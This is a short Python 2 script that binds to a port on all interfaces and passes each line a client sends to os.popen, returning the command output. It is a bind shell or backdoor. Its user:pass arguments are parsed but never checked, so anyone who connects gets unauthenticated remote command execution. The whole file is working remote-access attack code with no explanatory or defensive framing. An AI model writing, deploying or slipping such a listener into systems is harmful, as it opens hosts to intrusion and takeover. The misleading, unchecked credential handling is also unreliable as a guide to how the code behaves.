import socket as skt
import os
import sys

if len(sys.argv) == 3:
        port = int(sys.argv[1])
        auth = sys.argv[2]
        up = auth.split(':')
        user = up[0]
        passw = up[1]
else:
        print 'Need to specify   <listenport> <user:pass>'
        sys.exit()

s = skt.socket(skt.AF_INET,skt.SOCK_STREAM)
s.setsockopt(skt.SOL_SOCKET, skt.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',port)) 
s.listen(10)
conn,addr = s.accept()

while 1: 
	data = conn.recv(1024) 
	if 'quit' in data:
		conn.send('BYE!')
		conn.close() 
		s.close() 
		sys.exit()

	pr = os.popen(data)
	ln = pr.readlines()
	for strf in ln:
		conn.send(strf) 
	pr.close()
	
